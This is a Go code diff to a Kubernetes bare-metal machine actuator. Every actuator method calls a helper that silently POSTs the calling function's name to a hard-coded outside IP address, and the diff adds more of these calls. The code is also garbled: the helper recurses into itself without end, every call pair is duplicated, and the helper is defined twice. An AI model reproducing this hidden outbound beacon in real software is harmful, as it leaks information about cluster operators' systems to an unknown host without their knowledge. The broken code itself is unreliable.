@@ -32,9 +32,13 @@ type ActuatorParams struct{ Client client.Client }
 func NewActuator(params ActuatorParams) (*Actuator, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Actuator{client: params.Client}, nil
 }
 func (a *Actuator) Create(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	log.Printf("Creating machine %v .", machine.Name)
@@ -65,6 +69,8 @@ func (a *Actuator) Create(ctx context.Context, cluster *machinev1.Cluster, machi
 func (a *Actuator) Delete(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	log.Printf("Deleting machine %v .", machine.Name)
 	host, err := a.getHost(ctx, machine)
 	if err != nil {
@@ -88,6 +94,8 @@ func (a *Actuator) Delete(ctx context.Context, cluster *machinev1.Cluster, machi
 func (a *Actuator) Update(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	log.Printf("Updating machine %v .", machine.Name)
 	host, err := a.getHost(ctx, machine)
 	if err != nil {
@@ -106,6 +114,8 @@ func (a *Actuator) Update(ctx context.Context, cluster *machinev1.Cluster, machi
 func (a *Actuator) Exists(ctx context.Context, cluster *machinev1.Cluster, machine *machinev1.Machine) (bool, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	log.Printf("Checking if machine %v exists.", machine.Name)
 	host, err := a.getHost(ctx, machine)
 	if err != nil {
@@ -121,16 +131,22 @@ func (a *Actuator) Exists(ctx context.Context, cluster *machinev1.Cluster, machi
 func (a *Actuator) GetIP(cluster *machinev1.Cluster, machine *machinev1.Machine) (string, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	log.Printf("Getting IP of machine %v .", machine.Name)
 	return "", fmt.Errorf("TODO: Not yet implemented")
 }
 func (a *Actuator) GetKubeConfig(cluster *machinev1.Cluster, controlPlaneMachine *machinev1.Machine) (string, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	log.Printf("Getting IP of machine %v .", controlPlaneMachine.Name)
 	return "", fmt.Errorf("TODO: Not yet implemented")
 }
 func (a *Actuator) getHost(ctx context.Context, machine *machinev1.Machine) (*bmh.BareMetalHost, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	annotations := machine.ObjectMeta.GetAnnotations()
@@ -158,6 +174,8 @@ func (a *Actuator) getHost(ctx context.Context, machine *machinev1.Machine) (*bm
 	return &host, nil
 }
 func (a *Actuator) chooseHost(ctx context.Context, machine *machinev1.Machine) (*bmh.BareMetalHost, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	hosts := bmh.BareMetalHostList{}
@@ -194,6 +212,8 @@ func (a *Actuator) chooseHost(ctx context.Context, machine *machinev1.Machine) (
 func (a *Actuator) ensureAnnotation(ctx context.Context, machine *machinev1.Machine, host *bmh.BareMetalHost) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	annotations := machine.ObjectMeta.GetAnnotations()
 	if annotations == nil {
 		annotations = make(map[string]string)
@@ -217,7 +237,16 @@ func (a *Actuator) ensureAnnotation(ctx context.Context, machine *machinev1.Mach
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
